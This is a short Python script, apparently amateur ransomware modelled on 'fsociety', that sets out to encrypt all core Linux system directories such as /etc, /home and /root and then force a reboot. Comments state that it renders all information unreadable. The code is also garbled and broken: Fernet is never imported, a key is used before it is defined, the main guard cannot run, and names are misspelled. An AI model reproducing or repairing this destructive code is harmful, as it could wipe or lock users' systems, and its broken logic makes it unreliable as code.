#All imports here
import time
import os
import socket
import subprocess
import uuid
import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from paramiko import SSHClient

#Pre-programmed functions to be declared here
def fuxocyMain():
    #fuxsocy, running this script will render all information unreadable
    #All directories of a system
    dirs = ["/bin/", "/boot/", "/dev/", "/etc/", "/home/", "/lib/", "/lib32/", "/lib64/", "/media/", "/mnt/", "/opt/", "/proc/", "/root/", "/run/", "/sbin/", "/snap/", "/srv/", "/sys/", "/tmp/", "/usr/", "/var/"]

    #Generating random keys
    keySalt = uuid.uuid4().hex
    masterKey = Fernet.generate_key()

    #Global variables for encrypted files
    encryptedFiles = 0

    keySalt = uuid.uuid4().hex
    masterKey = Fernet.generate_key()

    f = Fernet(key)

    password = masterKey.encode() # Convert to type bytes
    salt = keySalt.encode()
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA512(),
        length=2048,
        salt=salt,
        iterations=100000,
        backend=default_backend()
        )
    key = base64.urlsafe_b64encode(kdf.derive(password))

    #Now ending the computer
    for x in range(0,dirs.count()):
        encryptedFiles = encryptedFiles + 1
        encryptedDisk = f.encrypt(dirs[x])

    #After all encryption is finished, reeboot the system.
    print(encryptedFiles + " core filesystems succesfully encrypted by root")
    print("All operations finished, rebooting")
    time.sleep(2)

    os.system('reboot')

#Start main program after all variables are declared
if __name__ == '__name__':
    os.system('clear')
    fuxsocyMain()
